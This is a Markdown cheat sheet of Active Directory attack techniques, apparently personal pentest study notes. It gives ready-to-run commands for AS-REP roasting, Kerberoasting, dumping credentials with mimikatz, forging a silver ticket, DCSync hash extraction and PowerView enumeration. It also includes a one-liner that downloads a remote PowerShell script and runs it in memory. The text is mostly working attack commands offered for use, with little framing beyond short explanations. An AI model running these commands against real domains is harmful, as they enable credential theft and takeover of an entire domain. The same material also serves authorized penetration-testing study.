> Also comprehensive: [AD Enumeration Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#domain-enumeration)

# Attack AD Authentication
## AS-REP Roasting
requires the AD user account option `Do not require Kerberos preauthentication` to be enabled. To check:
- Predefined Analysis in Bloodhound or
- PowerView’s Get-DomainUser function with the option `-PreauthNotRequired` (Windows)
- `impacket-GetNPUsers -dc-ip $ip_dc $domain/$user` (kali)
If we have GenericWrite or GenericAll on a user account, we can also enable this option our selfes ("Targeted AS-REP Roasting"). To attack:
```bash
impacket-GetNPUsers -dc-ip $ip_dc -request -outputfile hashes.asreproast $domain/$user
```
You can also use `-usersfile` to specify a list of usernames
Alternative on Windows: `Rubeus.exe asreproast /outfile:hashes.asreproast`
Then, crack the AS-REP hash with hashcat, see [[8_Hashes_cheatsheet#Hashcat]]

### Kerberoasting
Similar as AS-REP Roasting. But we attack a Service Ticket, not a TGT. We can extract password hashes from both, but this targets an SPN's service account, not a user account. As this requires a TGT, we either need to run it from a domain joined pc or provide impacket with any valid AD credentials.
> Only target SPN's running in the context of a user account. Otherwise, the password is randomly generated and infeasible to crack. The same is true for user `krbtgt`. With the right permissions, we could also set an SPN for any user account ("targeted Kerberoasting").
```bash
sudo impacket-GetUserSPNs -dc-ip $ip_dc -request -outputfile hashes.kerberoast $domain/$user
```
On error `KRB_AP_ERR_SKEW`: Synchronize kali's clock with the AD, using `ntpdate` or `rdate`
Alternative on Windows: `Rubeus.exe kerberoast /outfile:hashes.kerberoast`
Then, crack the TGS-REP hash with hashcat, see [[8_Hashes_cheatsheet#Hashcat]]

### Silver Ticket
Forge a service ticket. Requires:
- Domain SID (e.g. with `whoami`. It‘s an AD user's SID without the last value field)
- Target SPN (See output of the previous `impacket-GetUserSPNs` command)
- SPN NTLM Password Hash (e.g. mimikatz on a system with a session. `privilege::debug` and `sekurlsa::logonpasswords`)
```mimikatz
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /domain:corp.com /ptt /user:jeffadmin
```
> As we forge this ticket, we can select and user we want. Here, it's jeffadmin. A patch enforced since Oct. 22 denies the creation of service tickets for non-existent users. `/ptt` injects the ticket directly into memory.

### DC Synchronization
Requires user with `Replicating Directory Changes`, `Replicating Directory Changes All`, and `Replicating Directory Changes in Filtered Set` rights (by default: Domain Admins, Enterprise Admins, and Administrators).
Then, we can act as DC ourselfes and request all AD user's password hashes.
```mimikatz
lsadump::dcsync /user:corp\dave
```
Alternative on Kali: `impacket-secretsdump -just-dc-user $uname_target $domain/$uname_privileged:$password_privileged@$ip_dc` (e.g. `dave corp.com/jeffadmin:"Flowers1"@192.168.50.70`)


# Manual  Enumeration Approach
### Primary DC (PDC):
```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
```
and DN:
```powershell
([adsi]'').distinguishedName
```
Then set LDAP path of AD:
```powershell
$LDAP = LDAP://$PDC/$DN
```
(e.g. `LDAP://DCSRV1.beyond.com/DC=beyond,DC=com`)

Also, change the Enumeration Limit:
```powershell
$Global:FormatEnumerationLimit = 100
```

##### Set up `$dirsearcher`
```powershell
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher(New-Object System.DirectoryServices.DirectoryEntry($LDAP))
```
### User
```powershell
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()
Foreach($obj in $result){ $obj.Properties | select {$_.name}, {$_.memberof}, {$_.logoncount} | Format-List }
```
Alternative: `net user /domain`

### Groups
```powershell
$dirsearcher.filter="objectclass=group"
$result = $dirsearcher.FindAll()
Foreach($obj in $result){ $obj.Properties | select {$_.cn}, {$_.member} | Format-List }
```
Alternative: `net group /domain`
List of default groups: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups
To get more details on a group: `$dirsearcher.filter="(&(objectCategory=group)(cn=Sales Department))"; $dirsearcher.FindAll()`

### AD-integrated services
```powershell
setspn -L $user
```

### Logged-In users
```powershell
.\PsLoggedon.exe \\$host
```
(SysInternals, requires _Remote Registry service_ on the target which is disabled by default since Windows 8, but enabled on Windows Server 2012 R2, 2016 (1607), 2019 (1809), and Server 2022 (21H2))

### ACEs to an object
```powershell
Get-ObjectAcl -Identity $object [ | ? {"GenericAll", "GenericWrite", "WriteOwner", "WriteDACL" -eq $_.ActiveDirectoryRights} ] | Select ActiveDirectoryRights, SecurityIdentifier
```
The middle part restricts the search to full-access but can be left out.
Permission descriptions:
	GenericAll: Full permissions on object
	GenericWrite: Edit certain attributes on the object
	WriteOwner: Change ownership of the object
	WriteDACL: Edit ACE's applied to object
	AllExtendedRights: Change password, reset password, etc.
	ForceChangePassword: Password change for object
	Self (Self-Membership): Add ourselves to for example a group
The SecurityIdentifier names the principal that has the listed permission to the queued object. As object, we can use the cleartext name to any AD object, e.g., an user, group or share name.
Make SID human readable: `Convert-SidToName $sid` (PowerView)

-----------

# ADPeas
```powershell
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1);Invoke-adPEAS
```
Wrapper arount BloodHound, PowerView and much more.

# PowerView.ps1

##### Users
```powershell
Get-NetUser | select cn, pwdlastset,lastlogon
````

```powershell
Get-NetGroup | select cn, member
```
##### Systems
```powershell
Get-NetComputer | select operatingsystem, operatingsystemversion, dnshostname
```
##### Systems the current user has admin privs on
```powershell
Find-LocalAdminAccess
```
##### Logged-In users
```powershell
Get-NetSession -ComputerName $host -Verbose
```
(Only works below Windows Server 2019 build 1809 or Windows 10 build 1709)
##### AD-integrated services
```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
##### Shares
```powershell
Find-DomainShare
```
Use flag `-CheckShareAccess` to only list shares we have access to.
##### Check DCSync Permission
```powershell
Get-ObjectAcl -DistinguishedName "dc=XXX,dc=XXX,dc=XXX" -ResolveGUIDs | ?{($_.IdentityReference -match "XXXUSERNAMEXXX") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```
##### Map Trusts
```powershell
Get-NetForestDomain | Get-NetDomainTrust
```

